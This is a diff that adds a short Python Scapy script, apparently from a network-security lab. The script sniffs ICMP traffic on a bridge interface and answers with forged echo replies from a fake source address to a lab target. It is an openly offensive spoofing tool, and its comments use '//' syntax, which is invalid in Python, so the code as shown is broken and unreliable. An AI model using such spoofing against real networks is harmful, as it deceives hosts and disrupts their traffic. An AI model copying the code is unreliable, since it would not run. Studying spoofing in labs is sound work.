@@ -1,0 +1,16 @@
+#!/usr/bin/env python3
+
+from scapy.all import *
+def print_pkt(pkt):
+ pkt.show()
+
+def reply_icmp(pkt):
+ a = IP()
+ a.src = '1.2.3.4' //This is for the fake source IP Address or Server
+ a.dst = '10.9.0.5' //This is for the target address to be fooled 
+ b = ICMP(type = 0) //The type = 0 indicates that this is ICMP reply 
+ p = a/b
+ send(p)
+
+pkt = sniff(iface='br-6474ee4d2b42', filter='icmp', prn=reply_icmp) //When there is an icmp packet sniffed in interface br-6474ee4d2b42 , we will spoof the target with icmp reply
+//We can only check the traffic in Wireshark, set it to monitor the traffic of the ethernet br-6474ee4d2b42
